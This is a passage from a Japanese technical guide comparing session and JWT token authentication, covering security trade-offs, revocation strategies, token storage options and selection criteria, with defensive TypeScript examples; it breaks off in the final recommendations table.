# セッション vs トークン

> 認証状態の管理には「セッション方式」と「トークン方式」の2つの主要なアプローチがある。ステートフルとステートレスの本質的な違い、それぞれのメリット・デメリット、セキュリティ上のトレードオフ、保存場所の比較、そしてプロジェクト要件に応じた正しい選定基準を、実装コード付きで徹底解説する。

---

## この章で学ぶこと

- [ ] セッション方式とトークン方式の仕組みと本質的な違い（ステートフル vs ステートレス）を理解する
- [ ] 各方式のセキュリティ上のトレードオフ（XSS/CSRF/即時失効）を正確に把握する
- [ ] トークンの保存場所ごとのリスクを理解し、最適な保存戦略を選定できる
- [ ] プロジェクト要件（アーキテクチャ・規模・セキュリティ要件）に基づく適切な方式を選定できるようになる
- [ ] ハイブリッドアプローチ（JWT in HttpOnly Cookie）を実装できるようになる

---

## 前提知識

このガイドを読む前に、以下の知識があることを前提とする。

| 前提知識 | 参照先 |
|---------|--------|
| 認証と認可の基本概念 | [00-fundamentals/00-authentication-basics.md](./00-authentication-basics.md) |
| パスワードハッシュの仕組み | [00-fundamentals/01-password-hashing.md](./01-password-hashing.md) |
| HTTP の基礎（Cookie、ヘッダー） | [04-web-and-network](../../../04-web-and-network/) |
| 暗号化と署名の基礎 | [security-fundamentals/00-basics/](../../security-fundamentals/docs/00-basics/) |

---

## 1. 2つの方式の全体像

### 1.1 セッション方式（ステートフル）

```
セッション方式の認証フロー:

  ユーザー             サーバー              セッションストア
    │                   │                      │
    │ ① ログイン         │                      │
    │ (email + password) │                      │
    │──────────────────>│                      │
    │                   │ ② 認証成功            │
    │                   │ セッションデータ作成    │
    │                   │ { userId, role, ... } │
    │                   │─────────────────────>│
    │                   │ ③ session_id 返却     │
    │                   │<─────────────────────│
    │ ④ Set-Cookie:     │                      │
    │ session_id=abc123 │                      │
    │ HttpOnly; Secure  │                      │
    │<──────────────────│                      │
    │                   │                      │
    │  --- 以降のリクエスト ---                   │
    │                   │                      │
    │ ⑤ Cookie:         │                      │
    │ session_id=abc123 │                      │
    │──────────────────>│                      │
    │                   │ ⑥ セッションデータ取得 │
    │                   │─────────────────────>│
    │                   │ ⑦ { userId, role }   │
    │                   │<─────────────────────│
    │                   │ ⑧ ユーザー確認OK      │
    │ ⑨ レスポンス       │                      │
    │<──────────────────│                      │

  本質:
  → サーバーが「誰がログインしているか」を記憶（ステートフル）
  → Cookie にはセッション ID（ポインタ）のみ含む
  → 実際のデータはサーバー側のストア（Redis/DB）に保管
  → セッション ID は「引換券」、データは「金庫の中身」
```

**WHY: なぜセッション方式はサーバー側に状態を持つのか？**

セッション方式の核心は「信頼の一元管理」にある。認証情報をサーバー側で管理することで、以下のメリットが得られる:

1. **即時失効**: サーバー側のデータを削除するだけで、即座にアクセスを遮断できる
2. **データの安全性**: 認証データがクライアントに露出しない
3. **サイズ制限なし**: サーバー側に保存するため、セッションデータに実質的な容量制限がない
4. **改ざん不可能**: クライアントが持つのは ID のみで、データ自体を改ざんできない

代償として「スケーラビリティ」と「ストア管理」のコストが発生する。

### 1.2 トークン方式（ステートレス）

```
トークン方式の認証フロー:

  ユーザー             サーバー
    │                   │
    │ ① ログイン         │
    │ (email + password) │
    │──────────────────>│
    │                   │ ② 認証成功
    │                   │ JWT 生成（署名付き）
    │                   │ ┌─────────────────────┐
    │                   │ │ Header: { alg, typ } │
    │                   │ │ Payload: {           │
    │                   │ │   sub: "user_123",   │
    │                   │ │   role: "admin",     │
    │                   │ │   exp: 1700000000    │
    │                   │ │ }                    │
    │                   │ │ Signature: HMAC(     │
    │                   │ │   header.payload,    │
    │                   │ │   secret             │
    │                   │ │ )                    │
    │                   │ └─────────────────────┘
    │ ③ { accessToken } │
    │<──────────────────│
    │                   │
    │  --- 以降のリクエスト ---
    │                   │
    │ ④ Authorization:  │
    │ Bearer eyJhbG...  │
    │──────────────────>│
    │                   │ ⑤ JWT 検証
    │                   │ → 署名の確認（改ざんなし？）
    │                   │ → 有効期限チェック
    │                   │ → クレーム検証
    │                   │ → DB/ストアへのアクセス不要！
    │ ⑥ レスポンス       │
    │<──────────────────│

  本質:
  → トークン自体にユーザー情報を含む（自己完結型）
  → サーバーは状態を持たない（ステートレス）
  → 署名により改ざんを検知（ただし暗号化ではない）
  → トークンは「パスポート」、情報が記載されている
```

**WHY: なぜトークン方式はステートレスなのか？**

トークン方式の核心は「検証の分散化」にある。各サーバーが独立にトークンを検証できるため:

1. **水平スケーリング**: サーバーを増やしても共有ストアが不要
2. **マイクロサービス対応**: 各サービスが公開鍵だけで検証可能
3. **クロスドメイン**: API が異なるドメインでもヘッダーで送信可能
4. **モバイル対応**: Cookie に依存しないためネイティブアプリと相性が良い

代償として「即時失効」と「トークン肥大化」の問題が発生する。

---

## 2. 詳細比較

### 2.1 機能・アーキテクチャ比較表

```
┌──────────────────┬───────────────────────┬───────────────────────┐
│ 比較項目          │ セッション方式          │ トークン方式（JWT）      │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 状態管理          │ サーバー側（ステートフル） │ クライアント側           │
│                  │                       │ （ステートレス）         │
├──────────────────┼───────────────────────┼───────────────────────┤
│ ストレージ        │ Redis / DB / メモリ    │ 不要（署名検証のみ）     │
├──────────────────┼───────────────────────┼───────────────────────┤
│ スケーラビリティ   │ セッションストアの       │ ステートレスのため       │
│                  │ 共有・レプリケーション要  │ スケール容易            │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 即時失効          │ サーバー側で即時削除可能  │ 有効期限まで失効不可     │
│                  │                       │ （ブラックリスト要）     │
├──────────────────┼───────────────────────┼───────────────────────┤
│ データサイズ      │ Cookie: 小（~50B）     │ JWT: 大（~800B-2KB）   │
│                  │ セッションIDのみ         │ ペイロード含む          │
├──────────────────┼───────────────────────┼───────────────────────┤
│ CSRF 耐性        │ 脆弱（対策必須）        │ Authorization ヘッダー  │
│                  │                       │ なら不要               │
├──────────────────┼───────────────────────┼───────────────────────┤
│ XSS 耐性         │ HttpOnly Cookie で保護  │ localStorage 保存は    │
│                  │                       │ XSS に脆弱             │
├──────────────────┼───────────────────────┼───────────────────────┤
│ ネットワーク負荷   │ 低（ID のみ送信）       │ 高（毎回トークン送信）   │
├──────────────────┼───────────────────────┼───────────────────────┤
│ サーバー負荷      │ 毎リクエストでストア参照  │ 署名検証のみ（CPU負荷） │
├──────────────────┼───────────────────────┼───────────────────────┤
│ モバイル対応      │ Cookie 管理が煩雑       │ ヘッダーで簡単          │
├──────────────────┼───────────────────────┼───────────────────────┤
│ マイクロサービス   │ セッションストア共有が    │ 各サービスで独立検証可能  │
│                  │ 困難                   │ （公開鍵配布のみ）       │
├──────────────────┼───────────────────────┼───────────────────────┤
│ オフライン対応    │ 不可（ストア参照必須）    │ 可能（署名検証のみ）     │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 実装の複雑さ      │ 低（フレームワーク充実）  │ 中〜高（鍵管理、        │
│                  │                       │ リフレッシュ設計要）     │
├──────────────────┼───────────────────────┼───────────────────────┤
│ デバッグ容易性    │ サーバーログで追跡可能    │ jwt.io で内容確認可能   │
└──────────────────┴───────────────────────┴───────────────────────┘
```

### 2.2 コスト比較表

```
┌──────────────────┬───────────────────────┬───────────────────────┐
│ コスト要素        │ セッション方式          │ トークン方式            │
├──────────────────┼───────────────────────┼───────────────────────┤
│ インフラコスト    │ Redis/DBの運用費用      │ ほぼゼロ               │
│                  │ 月額 $10-100+         │ （CPU負荷のみ）         │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 開発コスト        │ 低（express-session等） │ 中（トークン管理設計）   │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 運用コスト        │ ストア監視・スケール管理 │ 鍵ローテーション管理    │
├──────────────────┼───────────────────────┼───────────────────────┤
│ 障害時の影響      │ ストア障害 → 全ユーザー  │ 鍵漏洩 → 全トークン    │
│                  │ ログアウト              │ 偽造可能               │
└──────────────────┴───────────────────────┴───────────────────────┘
```

---

## 3. セキュリティの詳細比較

### 3.1 セッション方式のセキュリティ

```
セッション方式のセキュリティプロファイル:

  ┌── 利点 ──────────────────────────────────────────┐
  │                                                  │
  │ ✓ サーバー側で即時無効化可能                        │
  │   → パスワード変更、不正検知時に即座に遮断            │
  │   → 特定デバイスのセッションだけを無効化可能           │
  │                                                  │
  │ ✓ HttpOnly Cookie でXSS耐性                       │
  │   → JavaScript からアクセス不可                     │
  │   → document.cookie で読み取り不能                  │
  │                                                  │
  │ ✓ セッションデータはサーバーに安全に保管              │
  │   → クライアントに機密情報が露出しない                │
  │   → 改ざんが不可能                                 │
  │                                                  │
  │ ✓ セッション固定攻撃の防御が確立                     │
  │   → ログイン時の ID ローテーションで対策              │
  │                                                  │
  │ ✓ アクティブセッション管理が容易                     │
  │   → ユーザーに「ログイン中のデバイス一覧」を表示可能    │
  │   → 「全デバイスからログアウト」が簡単に実装可能       │
  │                                                  │
  └──────────────────────────────────────────────────┘

  ┌── リスク ─────────────────────────────────────────┐
  │                                                  │
  │ ✗ CSRF攻撃に脆弱（Cookie 自動送信のため）           │
  │   → 対策: SameSite=Lax + CSRF トークン             │
  │                                                  │
  │ ✗ セッションハイジャック（ID 漏洩時）                │
  │   → 対策: セッション ID ローテーション、IP 検証       │
  │                                                  │
  │ ✗ セッションストアの SPOF（単一障害点）              │
  │   → 対策: Redis Sentinel / Cluster                │
  │                                                  │
  │ ✗ サーバー負荷（毎リクエストでストア参照）            │
  │   → 対策: Redis のレプリカ読み取り                  │
  │                                                  │
  └──────────────────────────────────────────────────┘
```

### 3.2 トークン方式（JWT）のセキュリティ

```
トークン方式のセキュリティプロファイル:

  ┌── 利点 ──────────────────────────────────────────┐
  │                                                  │
  │ ✓ CSRF攻撃の心配なし（Authorization ヘッダー使用時） │
  │   → ブラウザは Authorization ヘッダーを自動送信しない │
  │   → 攻撃者がヘッダーを設定できない                   │
  │                                                  │
  │ ✓ サーバーに状態不要（高可用性）                     │
  │   → ストア障害の影響を受けない                       │
  │   → サーバー再起動でもセッション維持                  │
  │                                                  │
  │ ✓ マイクロサービス間の認証が容易                     │
  │   → 各サービスが公開鍵だけで検証可能                  │
  │   → 認可サーバーへの問い合わせ不要                    │
  │                                                  │
  │ ✓ クロスドメイン対応                               │
  │   → Cookie のドメイン制約を受けない                  │
  │                                                  │
  └──────────────────────────────────────────────────┘

  ┌── リスク ─────────────────────────────────────────┐
  │                                                  │
  │ ✗ 即時失効が困難                                   │
  │   → 対策: 短い有効期限（15分）+ Refresh Token       │
  │   → 対策: ブラックリスト（ただしステートフルに戻る）    │
  │   → 対策: Token Version（ユーザーごとのバージョン番号）│
  │                                                  │
  │ ✗ localStorage 保存 → XSS で窃取可能              │
  │   → 対策: HttpOnly Cookie に保存（ハイブリッド）     │
  │   → 対策: メモリ内保持（リロードで消失）              │
  │                                                  │
  │ ✗ ペイロードが平文（Base64URL）                     │
  │   → 対策: 機密情報を含めない                        │
  │   → 対策: 必要なら JWE（暗号化 JWT）を使用           │
  │                                                  │
  │ ✗ 秘密鍵が漏洩すると全トークンが偽造可能              │
  │   → 対策: HSM / KMS で鍵管理                       │
  │   → 対策: 非対称鍵（RS256/ES256）で署名             │
  │   → 対策: 定期的な鍵ローテーション                   │
  │                                                  │
  │ ✗ トークンサイズが大きい（ヘッダー肥大）              │
  │   → 対策: 必要最小限のクレーム                       │
  │   → 対策: ES256 で署名サイズ削減                    │
  │                                                  │
  │ ✗ alg: "none" 攻撃、アルゴリズム混乱攻撃            │
  │   → 対策: algorithms パラメータで許可アルゴリズム限定  │
  │                                                  │
  └──────────────────────────────────────────────────┘
```

### 3.3 攻撃ベクトル別の比較表

```
┌──────────────────┬──────────────────────┬──────────────────────┐
│ 攻撃ベクトル      │ セッション方式         │ トークン方式           │
├──────────────────┼──────────────────────┼──────────────────────┤
│ XSS              │ ○ HttpOnly で保護    │ △ localStorage は    │
│                  │                      │   窃取可能            │
├──────────────────┼──────────────────────┼──────────────────────┤
│ CSRF             │ △ SameSite + Token   │ ○ Bearer ヘッダー    │
│                  │   で対策可能          │   なら影響なし         │
├──────────────────┼──────────────────────┼──────────────────────┤
│ セッション        │ △ ID ローテーション   │ ○ 署名検証で改ざん    │
│ ハイジャック      │   で対策              │   検知                │
├──────────────────┼──────────────────────┼──────────────────────┤
│ リプレイ攻撃      │ ○ ストアで管理可能    │ △ jti + ブラック      │
│                  │                      │   リスト必要           │
├──────────────────┼──────────────────────┼──────────────────────┤
│ ブルートフォース   │ ○ 256bit ランダム ID │ ○ 暗号署名で保護      │
├──────────────────┼──────────────────────┼──────────────────────┤
│ 中間者攻撃        │ ○ Secure Cookie      │ ○ HTTPS 必須         │
├──────────────────┼──────────────────────┼──────────────────────┤
│ トークン窃取      │ ○ 即時無効化可能      │ ✗ 有効期限まで有効    │
├──────────────────┼──────────────────────┼──────────────────────┤
│ 鍵の漏洩          │ △ ストアのセキュリティ │ ✗ 全トークン偽造可能   │
│                  │   に依存              │                      │
└──────────────────┴──────────────────────┴──────────────────────┘
```

---

## 4. JWT の失効対策パターン

JWT の最大の弱点である「即時失効の困難さ」に対する3つの主要な対策パターンを解説する。

### 4.1 短い有効期限 + Refresh Token

```
最も標準的な失効対策:

  Access Token（短命: 15分）:
  → API アクセスに使用
  → 失効しても15分以内に自然に切れる
  → 窃取されても被害は限定的

  Refresh Token（長命: 7-30日）:
  → 新しい Access Token の取得に使用
  → サーバー側で管理（ステートフル）
  → Rotation: 使用するたびに新しい Refresh Token を発行

  フロー:
    ① Access Token で API アクセス
    ② Access Token 期限切れ → 401 Unauthorized
    ③ Refresh Token で新しい Access Token を取得
    ④ Refresh Token も新しいものに置き換え（Rotation）
    ⑤ 新しい Access Token で再試行

  Refresh Token Rotation の重要性:
  → Refresh Token が窃取された場合:
     - 正規ユーザーと攻撃者が同じ Refresh Token を持つ
     - 先に使った方が新しい Refresh Token を取得
     - もう一方が古い Refresh Token を使おうとすると検知
     - 全 Refresh Token を無効化 → 両者をログアウト
```

```typescript
// Refresh Token Rotation の実装
import { SignJWT, jwtVerify } from 'jose';
import crypto from 'crypto';

const ACCESS_TOKEN_EXPIRY = '15m';
const REFRESH_TOKEN_EXPIRY_DAYS = 7;

interface RefreshTokenRecord {
  token: string;       // ハッシュ化されたトークン
  userId: string;
  family: string;      // トークンファミリー（Rotation 追跡用）
  expiresAt: Date;
  used: boolean;       // 使用済みフラグ
}

// Access Token 発行
async function issueAccessToken(userId: string, role: string): Promise<string> {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  return new SignJWT({ sub: userId, role })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime(ACCESS_TOKEN_EXPIRY)
    .setJti(crypto.randomUUID())
    .sign(secret);
}

// Refresh Token 発行
async function issueRefreshToken(userId: string, family?: string): Promise<string> {
  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

  await db.refreshToken.create({
    data: {
      token: hashedToken,
      userId,
      family: family || crypto.randomUUID(), // 新規ログイン時は新しいファミリー
      expiresAt: new Date(Date.now() + REFRESH_TOKEN_EXPIRY_DAYS * 24 * 60 * 60 * 1000),
      used: false,
    },
  });

  return token;
}

// Refresh Token によるトークン更新
async function refreshTokens(refreshToken: string): Promise<{
  accessToken: string;
  refreshToken: string;
}> {
  const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');

  const record = await db.refreshToken.findUnique({
    where: { token: hashedToken },
  });

  if (!record || record.expiresAt < new Date()) {
    throw new Error('Invalid or expired refresh token');
  }

  // 既に使用済みのトークンが再利用された → 窃取の可能性
  if (record.used) {
    // 同じファミリーの全トークンを無効化（セキュリティ対策）
    await db.refreshToken.deleteMany({
      where: { family: record.family },
    });
    throw new Error('Refresh token reuse detected - all sessions revoked');
  }

  // 使用済みにマーク
  await db.refreshToken.update({
    where: { token: hashedToken },
    data: { used: true },
  });

  // 新しいトークンペアを発行（同じファミリー）
  const user = await db.user.findUnique({ where: { id: record.userId } });
  if (!user) throw new Error('User not found');

  const newAccessToken = await issueAccessToken(user.id, user.role);
  const newRefreshToken = await issueRefreshToken(user.id, record.family);

  return { accessToken: newAccessToken, refreshToken: newRefreshToken };
}
```

### 4.2 ブラックリスト方式

```typescript
// Redis ベースのブラックリスト
import Redis from 'ioredis';

class TokenBlacklist {
  private redis: Redis;

  constructor(redisUrl: string) {
    this.redis = new Redis(redisUrl);
  }

  // トークンをブラックリストに追加
  async revoke(jti: string, expiration: number): Promise<void> {
    const ttl = expiration - Math.floor(Date.now() / 1000);
    if (ttl > 0) {
      // 残りの有効期限分だけ保持（自動削除でメモリ効率化）
      await this.redis.setex(`bl:${jti}`, ttl, '1');
    }
  }

  // ブラックリストチェック
  async isRevoked(jti: string): Promise<boolean> {
    return (await this.redis.exists(`bl:${jti}`)) === 1;
  }

  // ユーザーの全トークンを無効化（Token Version 方式）
  async revokeAllForUser(userId: string): Promise<void> {
    // ユーザーのトークンバージョンをインクリメント
    await this.redis.incr(`tv:${userId}`);
  }

  // トークンバージョンの検証
  async isTokenVersionValid(userId: string, tokenVersion: number): Promise<boolean> {
    const currentVersion = await this.redis.get(`tv:${userId}`);
    return !currentVersion || tokenVersion >= parseInt(currentVersion, 10);
  }
}

const blacklist = new TokenBlacklist(process.env.REDIS_URL!);

// トークン検証フローに組み込む
async function verifyAccessToken(token: string) {
  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  const { payload } = await jwtVerify(token, secret, {
    algorithms: ['HS256'],
  });

  // ブラックリストチェック
  if (payload.jti && await blacklist.isRevoked(payload.jti as string)) {
    throw new Error('Token has been revoked');
  }

  // Token Version チェック
  if (payload.tv !== undefined) {
    const isValid = await blacklist.isTokenVersionValid(
      payload.sub as string,
      payload.tv as number
    );
    if (!isValid) throw new Error('Token version outdated');
  }

  return payload;
}
```

### 4.3 Token Version 方式

```typescript
// Token Version（DB ベース、ブラックリスト不要）
// ユーザーテーブルに tokenVersion カラムを追加

// JWT 発行時に現在のバージョンを含める
async function issueTokenWithVersion(userId: string): Promise<string> {
  const user = await db.user.findUnique({ where: { id: userId } });
  if (!user) throw new Error('User not found');

  const secret = new TextEncoder().encode(process.env.JWT_SECRET!);
  return new SignJWT({
    sub: userId,
    role: user.role,
    tv: user.tokenVersion, // トークンバージョンを含める
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(secret);
}

// 全トークン無効化（パスワード変更時等）
async function revokeAllTokens(userId: string): Promise<void> {
  await db.user.update({
    where: { id: userId },
    data: { tokenVersion: { increment: 1 } }, // バージョンをインクリメント
  });
}

// 検証時にバージョンチェック
async function verifyTokenVersion(payload: {
  sub: string;
  tv: number;
}): Promise<boolean> {
  const user = await db.user.findUnique({
    where: { id: payload.sub },
    select: { tokenVersion: true },
  });
  return user !== null && payload.tv >= user.tokenVersion;
}
```

---

## 5. ハイブリッドアプローチ（推奨）

### 5.1 概要

```
推奨: JWT を HttpOnly Cookie に保存するハイブリッドアプローチ:

  トークンの利点（ステートレス検証）+ Cookie の利点（XSS 耐性）

  ┌──────────────────────────────────────────────────┐
  │                                                  │
  │  ログイン時:                                       │
  │    サーバー → JWT 生成                              │
  │    サーバー → Set-Cookie: token=eyJ..;              │
  │               HttpOnly; Secure; SameSite=Lax       │
  │                                                  │
  │  リクエスト時:                                      │
  │    ブラウザ → Cookie: token=eyJ..                   │
  │    サーバー → JWT 検証（署名確認のみ、ストア不要）     │
  │                                                  │
  │  利点の組合せ:                                      │
  │  ✓ JavaScript からトークンにアクセス不可（XSS 耐性）  │
  │  ✓ ステートレス検証（サーバーに状態不要）              │
  │  ✓ CSRF は SameSite=Lax で基本防御                 │
  │  ✓ Secure 属性で HTTPS 強制                        │
  │                                                  │
  │  注意点:                                           │
  │  △ CSRF 対策は SameSite だけでなく Origin 検証も推奨  │
  │  △ Cookie サイズ上限（~4KB）に注意                   │
  │  △ クロスドメインでは使えない                         │
  │                                                  │
  └──────────────────────────────────────────────────┘
```

### 5.2 完全実装例

```typescript
// ハイブリッドアプローチの完全実装
import { SignJWT, jwtVerify } from 'jose';
import { cookies } from 'next/headers';
import crypto from 'crypto';

// 環境変数から秘密鍵を取得
const secret = new TextEncoder().encode(process.env.JWT_SECRET!);

// --- ログイン処理 ---
async function login(email: string, password: string) {
  // 1. ユーザー認証
  const user = await authenticateUser(email, password);
  if (!user) {
    throw new Error('Invalid credentials');
  }

  // 2. Access Token（JWT）を生成
  const accessToken = await new SignJWT({
    sub: user.id,
    role: user.role,
    email: user.email,
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(secret);

  // 3. HttpOnly Cookie に設定
  const cookieStore = await cookies();
  cookieStore.set('access_token', accessToken, {
    httpOnly: true,      // JavaScript からアクセス不可
    secure: true,        // HTTPS のみ
    sameSite: 'lax',     // CSRF 基本防御
    path: '/',
    maxAge: 15 * 60,     // 15分
  });

  // 4. Refresh Token は別の Cookie（長い有効期限）
  const refreshToken = crypto.randomBytes(32).toString('hex');
  const hashedRefresh = crypto.createHash('sha256').update(refreshToken).digest('hex');

  await db.refreshToken.create({
    data: {
      token: hashedRefresh,
      userId: user.id,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    },
  });

  cookieStore.set('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',             // Refresh は Strict
    path: '/api/auth/refresh',      // リフレッシュ API のみ
    maxAge: 7 * 24 * 60 * 60,       // 7日
  });

  return { user: { id: user.id, email: user.email, role: user.role } };
}

// --- リクエスト検証ミドルウェア ---
async function verifyAuth(): Promise<{
  userId: string;
  role: string;
  email: string;
} | null> {
  const cookieStore = await cookies();
  const token = cookieStore.get('access_token')?.value;
  if (!token) return null;

  try {
    const { payload } = await jwtVerify(token, secret, {
      algorithms: ['HS256'],
    });
    return {
      userId: payload.sub as string,
      role: payload.role as string,
      email: payload.email as string,
    };
  } catch {
    return null; // トークン無効 → 未認証
  }
}

// --- トークンリフレッシュ ---
async function refreshAccessToken(): Promise<void> {
  const cookieStore = await cookies();
  const refreshToken = cookieStore.get('refresh_token')?.value;
  if (!refreshToken) throw new Error('No refresh token');

  const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');
  const record = await db.refreshToken.findUnique({
    where: { token: hashedToken, expiresAt: { gt: new Date() } },
    include: { user: true },
  });

  if (!record) throw new Error('Invalid refresh token');

  // 新しい Access Token を発行
  const newAccessToken = await new SignJWT({
    sub: record.userId,
    role: record.user.role,
    email: record.user.email,
  })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .setJti(crypto.randomUUID())
    .sign(secret);

  cookieStore.set('access_token', newAccessToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    path: '/',
    maxAge: 15 * 60,
  });

  // Refresh Token Rotation: 旧トークン削除、新トークン発行
  await db.refreshToken.delete({ where: { token: hashedToken } });

  const newRefreshToken = crypto.randomBytes(32).toString('hex');
  const newHashedRefresh = crypto.createHash('sha256').update(newRefreshToken).digest('hex');

  await db.refreshToken.create({
    data: {
      token: newHashedRefresh,
      userId: record.userId,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    },
  });

  cookieStore.set('refresh_token', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh',
    maxAge: 7 * 24 * 60 * 60,
  });
}

// --- ログアウト ---
async function logout(): Promise<void> {
  const cookieStore = await cookies();
  const refreshToken = cookieStore.get('refresh_token')?.value;

  // Refresh Token を DB から削除
  if (refreshToken) {
    const hashedToken = crypto.createHash('sha256').update(refreshToken).digest('hex');
    await db.refreshToken.delete({ where: { token: hashedToken } }).catch(() => {});
  }

  // Cookie を無効化
  cookieStore.delete('access_token');
  cookieStore.delete('refresh_token');
}
```

### 5.3 クライアント側の自動リフレッシュ（SPA）

```typescript
// fetch のラッパー: 401 時に自動でトークンリフレッシュ
class AuthenticatedFetch {
  private isRefreshing = false;
  private refreshPromise: Promise<void> | null = null;

  async fetch(url: string, options?: RequestInit): Promise<Response> {
    let response = await fetch(url, {
      ...options,
      credentials: 'include', // Cookie を含める
    });

    // 401 なら Refresh Token でトークン更新を試行
    if (response.status === 401) {
      await this.refreshToken();
      // リフレッシュ成功後にリトライ
      response = await fetch(url, {
        ...options,
        credentials: 'include',
      });
    }

    return response;
  }

  private async refreshToken(): Promise<void> {
    // 同時に複数のリフレッシュ要求を防止
    if (this.isRefreshing) {
      return this.refreshPromise!;
    }

    this.isRefreshing = true;
    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include',
    }).then((res) => {
      if (!res.ok) {
        // リフレッシュ失敗 → ログインページへ
        window.location.href = '/login';
        throw new Error('Session expired');
      }
    }).finally(() => {
      this.isRefreshing = false;
      this.refreshPromise = null;
    });

    return this.refreshPromise;
  }
}

// 使用例
const api = new AuthenticatedFetch();

async function fetchUserProfile() {
  const response = await api.fetch('/api/user/profile');
  if (!response.ok) throw new Error('Failed to fetch profile');
  return response.json();
}
```

---

## 6. トークン保存場所の比較

### 6.1 比較表

```
ブラウザでのトークン保存場所:

┌────────────────┬────────┬────────┬──────────┬──────────────────────┐
│ 保存場所        │ XSS耐性│ CSRF耐性│ 永続性   │ 推奨度                │
├────────────────┼────────┼────────┼──────────┼──────────────────────┤
│ HttpOnly Cookie│ ✓ 安全 │ △ 対策要│ ✓ 永続  │ ◎ 最も推奨            │
├────────────────┼────────┼────────┼──────────┼──────────────────────┤
│ localStorage   │ ✗ 脆弱 │ ✓ 安全 │ ✓ 永続  │ ✗ 非推奨              │
├────────────────┼────────┼────────┼──────────┼──────────────────────┤
│ sessionStorage │ ✗ 脆弱 │ ✓ 安全 │ △ タブ単位│ ✗ 非推奨              │
├────────────────┼────────┼────────┼──────────┼──────────────────────┤
│ メモリ（変数）  │ ○ 比較的│ ✓ 安全 │ ✗ 消失  │ △ 特定ケースで有効     │
│                │   安全 │        │          │ （SPA + Refresh Token）│
├────────────────┼────────┼────────┼──────────┼──────────────────────┤
│ Web Worker     │ ✓ 安全 │ ✓ 安全 │ ✗ 消失  │ ○ 高セキュリティ要件向け│
└────────────────┴────────┴────────┴──────────┴──────────────────────┘
```

### 6.2 各保存場所の詳細解説

```
■ HttpOnly Cookie が推奨される理由:
  → XSS でトークンを読み取れない（document.cookie で不可）
  → SameSite 属性で CSRF も防御可能
  → ブラウザが自動送信（実装が簡潔）
  → Secure 属性で HTTPS 強制

■ localStorage が非推奨の理由:
  → XSS 脆弱性1つでトークン窃取
  → window.localStorage.getItem('token') で読み取り可能
  → HttpOnly に相当する保護機能がない
  → 一度窃取されると有効期限まで悪用可能
  → 証拠: OWASP は localStorage でのトークン保存を非推奨

■ メモリ保存（Auth0/Okta のアプローチ）:
  → Access Token を JavaScript 変数（クロージャ内）に保持
  → XSS でもスコープ外なのでアクセス困難（不可能ではない）
  → ページリロード時に Refresh Token（HttpOnly Cookie）で再取得
  → 完全な保護ではないが、localStorage より安全

■ Web Worker 保存（最高セキュリティ）:
  → トークンを Web Worker 内に隔離
  → メインスレッドからアクセス不可
  → Worker 経由で API リクエストを送信
  → 実装が複雑だが XSS 耐性が最も高い
```

```typescript
// Web Worker によるトークン隔離（高セキュリティ向け）
// auth-worker.ts
let accessToken: string | null = null;

self.addEventListener('message', async (event) => {
  const { type, payload } = event.data;

  switch (type) {
    case 'SET_TOKEN':
      accessToken = payload.token;
      break;

    case 'FETCH':
      const response = await fetch(payload.url, {
        ...payload.options,
        headers: {
          ...payload.options?.headers,
          Authorization: accessToken ? `Bearer ${accessToken}` : '',
        },
      });
      const data = await response.json();
      self.postMessage({ type: 'FETCH_RESULT', requestId: payload.requestId, data });
      break;

    case 'CLEAR_TOKEN':
      accessToken = null;
      break;
  }
});

// メインスレッドから使用
// const worker = new Worker('auth-worker.ts');
// worker.postMessage({ type: 'SET_TOKEN', payload: { token } });
// worker.postMessage({
//   type: 'FETCH',
//   payload: { url: '/api/data', options: {}, requestId: '1' }
// });
```

---

## 7. 選定ガイドライン

### 7.1 プロジェクトタイプ別の推奨

```
┌─────────────────────────────────────────────────────────────┐
│ プロジェクトタイプ別の推奨方式                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ■ Next.js / フルスタック Web アプリ:                         │
│    → ハイブリッド（JWT in HttpOnly Cookie）                    │
│    → 理由: SSR + SPA 両対応、CSRF/XSS 対策済み                │
│    → Refresh Token Rotation で長期セッション                  │
│                                                             │
│  ■ SPA + 別バックエンド API（同一ドメイン）:                    │
│    → JWT in HttpOnly Cookie（BFF経由）                       │
│    → 理由: BFF が Cookie を管理、SPA は Cookie を意識しない     │
│                                                             │
│  ■ SPA + 別バックエンド API（クロスドメイン）:                   │
│    → メモリ保持 + Refresh Token in HttpOnly Cookie            │
│    → 理由: CORS 制約で Cookie が使えない場合                    │
│                                                             │
│  ■ モバイルアプリ + API:                                      │
│    → JWT（Secure Storage に保存: Keychain / Keystore）        │
│    → Access Token(15分) + Refresh Token(30日)                │
│    → 理由: Cookie 概念がない、Secure Storage は OS が保護       │
│                                                             │
│  ■ マイクロサービス間通信:                                     │
│    → JWT（サービス間は短命トークン）                            │
│    → mTLS（相互TLS認証）を併用                                │
│    → 理由: 各サービスが独立検証、中央認可不要                    │
│                                                             │
│  ■ 伝統的 Web アプリ（MPA / サーバーレンダリング）:              │
│    → セッション + Cookie                                     │
│    → 理由: 最もシンプルで安全、express-session 等のライブラリ充実 │
│                                                             │
│  ■ B2B エンタープライズ:                                      │
│    → セッション（即時無効化が重要な場合）                       │
│    → SAML / OIDC for SSO                                    │
